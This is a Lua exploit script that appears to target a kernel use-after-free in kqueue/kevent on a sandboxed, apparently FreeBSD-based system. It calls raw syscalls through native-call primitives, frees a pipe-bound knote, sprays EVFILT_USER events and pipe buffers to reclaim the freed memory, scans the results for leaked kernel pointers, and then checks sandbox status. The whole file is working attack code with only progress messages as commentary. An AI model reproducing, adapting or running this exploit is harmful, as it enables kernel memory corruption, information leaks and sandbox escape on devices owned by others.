--[[
    uaf_data_only_selfcontained.lua
    UAF data-only exploitation - no external deps
]]

local mem = rawget(_G, "memory")
local nat = rawget(_G, "native")
local sys = rawget(_G, "syscall")

local EVFILT_READ = 0xFFFF
local EVFILT_USER = 0xFFF9
local EV_ADD     = 0x0001
local EV_ENABLE  = 0x0004
local EV_CLEAR   = 0x0020

local function tonn(v)
    if v == nil then return 0 end
    if type(v) == "table" and v.h then return v.h * 4294967296 + v.l end
    return tonumber(tostring(v or 0)) or 0
end

local function toaddr(v)
    if v == nil then return 0 end
    if type(v) == "table" and v.h then return v.h * 4294967296 + v.l end
    return tonumber(tostring(v))
end

local function find_tramp(w)
    for i = 0, 35 do
        if mem.read_byte(w + i) == 0x49 and mem.read_byte(w + i + 1) == 0x89 and mem.read_byte(w + i + 2) == 0xCA then
            return i
        end
    end
    return 7
end

local function fcall(scno, r1, r2, r3, r4, r5, r6)
    local w = toaddr(sys.syscall_wrapper[scno])
    if w == 0 then return nil end
    local tramp = w + find_tramp(w)
    return tonn(nat.fcall_with_rax(tramp, scno, r1 or 0, r2 or 0, r3 or 0, r4 or 0, r5 or 0, r6 or 0))
end

local function mkkev(filter, ident, flags, fflags, data, udata)
    local ev = mem.alloc(32)
    mem.write_qword(ev + 0, ident or 0)
    mem.write_word(ev + 8, filter)
    mem.write_word(ev + 10, flags or 0)
    mem.write_dword(ev + 12, fflags or 0)
    mem.write_qword(ev + 16, data or 0)
    mem.write_qword(ev + 24, udata or 0)
    return ev
end

local function parse_kev(buf, idx)
    local off = idx * 32
    return {
        ident  = tonn(mem.read_qword(buf + off)),
        filter = tonn(mem.read_word(buf + off + 8)),
        flags  = tonn(mem.read_word(buf + off + 10)),
        fflags = tonn(mem.read_dword(buf + off + 12)),
        data   = tonn(mem.read_qword(buf + off + 16)),
        udata  = tonn(mem.read_qword(buf + off + 24)),
    }
end

local function is_kptr(v)
    return v > 0xFFFF000000000000
end

-- Resolve syscalls
sys.resolve({kqueue = 362, kevent = 363, pipe = 42, close = 6, write = 4, read = 3, getpid = 20})

print("[+] UAF Data-Only Exploitation\n")

-- Phase 1: Basic UAF confirm + EVFILT_USER spray
print("[*] Phase 1: UAF + EVFILT_USER spray\n")

for round = 1, 5 do
    print(string.format("[%d/5] ---", round))
    
    local kq = tonn(fcall(362, 0, 0, 0, 0, 0, 0))
    local pbuf = mem.alloc(16)
    fcall(42, pbuf, 0, 0, 0, 0, 0)
    local rd = tonn(mem.read_dword(pbuf))
    local wr = tonn(mem.read_dword(pbuf + 4))
    
    local ev = mkkev(EVFILT_READ, rd, EV_ADD + EV_ENABLE, 0, 0, 0)
    fcall(363, kq, ev, 1, 0, 0, 0)
    
    -- Pre-spray EVFILT_USER (50)
    for i = 1, 50 do
        local uev = mkkev(EVFILT_USER, i, EV_ADD + EV_ENABLE, 0, 0, i)
        fcall(363, kq, uev, 1, 0, 0, 0)
    end
    
    -- Close pipe
    fcall(6, rd, 0, 0, 0, 0, 0)
    fcall(6, wr, 0, 0, 0, 0, 0)
    
    -- Post-spray EVFILT_USER (50)
    for i = 51, 100 do
        local uev = mkkev(EVFILT_USER, i, EV_ADD + EV_ENABLE, 0, 0, i)
        fcall(363, kq, uev, 1, 0, 0, 0)
    end
    
    -- Read events
    local out = mem.alloc(3200)
    local ne = fcall(363, kq, 0, out, 100, 0, 0)
    
    if ne and ne > 0 then
        local kps = 0
        for i = 0, ne - 1 do
            local kev = parse_kev(out, i)
            if is_kptr(kev.ident) then kps = kps + 1 end
            if is_kptr(kev.udata) then kps = kps + 1 end
            if is_kptr(kev.data) then kps = kps + 1 end
        end
        print(string.format("  Round %d: %d events, %d kernel ptrs", round, ne, kps))
        if kps > 0 then
            for i = 0, ne - 1 do
                local kev = parse_kev(out, i)
                if is_kptr(kev.ident) or is_kptr(kev.udata) then
                    print(string.format("    [!] KPTR[%d]: ident=0x%x udata=0x%x data=0x%x", i, kev.ident, kev.udata, kev.data))
                end
            end
        end
    else
        print(string.format("  Round %d: no events (nil=%s)", round, tostring(ne)))
    end
    
    fcall(363, kq, 0, 0, 0, 0, 0)
end

-- Phase 2: UAF + pipe data spray (try to overlap knote with pipe buffer)
print("\n[*] Phase 2: UAF + precise pipe data spray\n")

local kq2 = tonn(fcall(362, 0, 0, 0, 0, 0, 0))
local pbuf2 = mem.alloc(16)
fcall(42, pbuf2, 0, 0, 0, 0, 0)
local rd2 = tonn(mem.read_dword(pbuf2))
local wr2 = tonn(mem.read_dword(pbuf2 + 4))

-- Write spray data to pipe BEFORE registering EVFILT_READ
local spray = mem.alloc(256)
for j = 0, 255 do
    mem.write_byte(spray + j, 0x42)
end
-- Put marker at potential kn_fop offset (0x68)
mem.write_qword(spray + 0x68, 0x4242424242424242)
fcall(4, wr2, spray, 256, 0, 0, 0)
print("[+] Written 256 bytes to pipe")

-- Read some data back to make pipe buffer exist but with our data
local rbuf = mem.alloc(128)
fcall(3, rd2, rbuf, 128, 0, 0, 0)

-- Register EVFILT_READ
local ev2 = mkkev(EVFILT_READ, rd2, EV_ADD + EV_ENABLE, 0, 0, 0)
fcall(363, kq2, ev2, 1, 0, 0, 0)
print("[+] EVFILT_READ registered after pipe data write")

-- Close pipe
fcall(6, rd2, 0, 0, 0, 0, 0)
fcall(6, wr2, 0, 0, 0, 0, 0)
print("[+] Pipe closed (UAF - freed knote may overlap pipe buf)")

-- Read events
local out2 = mem.alloc(320)
local ok2, ne2 = pcall(fcall, 363, kq2, 0, out2, 5, 0, 0)
if ok2 and ne2 and ne2 > 0 then
    print(string.format("[!] GOT %d events from freed knote!", ne2))
    for i = 0, ne2 - 1 do
        local kev = parse_kev(out2, i)
        print(string.format("  ev[%d]: ident=0x%x filter=%d data=0x%x udata=0x%x",
            i, kev.ident, kev.filter, kev.data, kev.udata))
        if kev.fflags == 0x42424242 or kev.data == 0x4242424242424242 then
            print("    [!] MATCHES pipe spray data! Buffer possibly overlapped!")
        end
    end
else
    print("[-] No events from freed knote")
    if not ok2 then
        print("[!] fcall crashed - UAF active (knote not overwritten)")
    end
end

fcall(363, kq2, 0, 0, 0, 0, 0)

-- Phase 3: Test if UAF survived with different spray patterns
print("\n[*] Phase 3: UAF with repeating spray cycles\n")

for cycle = 1, 3 do
    print(string.format("[Cycle %d]", cycle))
    
    local kq3 = tonn(fcall(362, 0, 0, 0, 0, 0, 0))
    local pbuf3 = mem.alloc(16)
    fcall(42, pbuf3, 0, 0, 0, 0, 0)
    local rd3 = tonn(mem.read_dword(pbuf3))
    local wr3 = tonn(mem.read_dword(pbuf3 + 4))
    
    local ev3 = mkkev(EVFILT_READ, 0xDEAD, EV_ADD + EV_ENABLE, 0, 0, 0)
    fcall(363, kq3, ev3, 1, 0, 0, 0)
    
    fcall(6, rd3, 0, 0, 0, 0, 0)
    fcall(6, wr3, 0, 0, 0, 0, 0)
    
    -- Try EVFILT_USER with specific ident to reclaim
    for i = 0, 199 do
        local uev3 = mkkev(EVFILT_USER, 0xBEEF + i, EV_ADD + EV_ENABLE, 0, 0, 0xBEEF + i)
        fcall(363, kq3, uev3, 1, 0, 0, 0)
    end
    
    local out3 = mem.alloc(6400)
    local ne3 = fcall(363, kq3, 0, out3, 200, 0, 0)
    if ne3 and ne3 > 0 then
        local has_kptr = false
        for i = 0, ne3 - 1 do
            local kev = parse_kev(out3, i)
            if is_kptr(kev.ident) or is_kptr(kev.udata) then
                if not has_kptr then
                    print(string.format("  Cycle %d: KPTR found!", cycle))
                    has_kptr = true
                end
                print(string.format("    [%d] ident=0x%x udata=0x%x", i, kev.ident, kev.udata))
            end
        end
        if not has_kptr then
            print(string.format("  Cycle %d: %d events, 0 kptrs (as expected)", cycle, ne3))
        end
    else
        print(string.format("  Cycle %d: no events", cycle))
    end
    
    fcall(363, kq3, 0, 0, 0, 0, 0)
end

-- Phase 4: Check is_in_sandbox still active
local sb = rawget(_G, "is_in_sandbox")
if sb then
    print("\n[+] is_in_sandbox() = " .. tonn(sb()))
end

print("\n[+] Done")
